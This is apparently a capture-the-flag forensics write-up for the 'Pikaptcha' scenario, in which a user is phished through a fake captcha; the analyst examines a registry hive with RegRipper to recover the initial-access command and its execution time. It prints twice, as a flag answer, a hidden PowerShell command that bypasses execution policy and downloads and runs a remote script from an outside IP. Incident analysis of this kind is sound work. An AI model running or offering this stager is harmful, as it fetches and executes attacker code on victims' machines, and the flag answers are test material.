# Pikaptcha
**Scenario:**
Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.

## Task 1
It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.

### Registry Analysis
To analyze the registry for the user, I will use ![RegRipper](https://github.com/keydet89/RegRipper3.0) and run all the plugins applicable to the user's registry hive and save it to a text file to go through.

```bash
PS C:\Users\analyst\Desktop\Tools\RegRipper3.0-master > .\rip.exe -r C:\Users\analyst\Desktop\Pikaptcha\C\Users\happy.grunwald\NTUSER.DAT -a > C:\Users\analyst\Desktop\Pikaptcha\Registry\happyNT.txt
```
After going through the text file, I found the flag as part of the 

```text
runmru v.20200525
(NTUSER.DAT) Gets contents of user's RunMRU key

RunMru
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
LastWrite Time 2024-09-23 05:07:45Z
MRUList = ba
a   %tmp%\1
b   powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1
```

### Flag
```text
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
```

## Task 2
At what time in UTC did the malicious payload execute?

## Explanation
Because the last write time in the RunMRU key was the malicious powershell command, we can assume that the last write tag for that key is also the time of execution for the payload.

### Flag
```text
2024-09-23 05:07:45
```
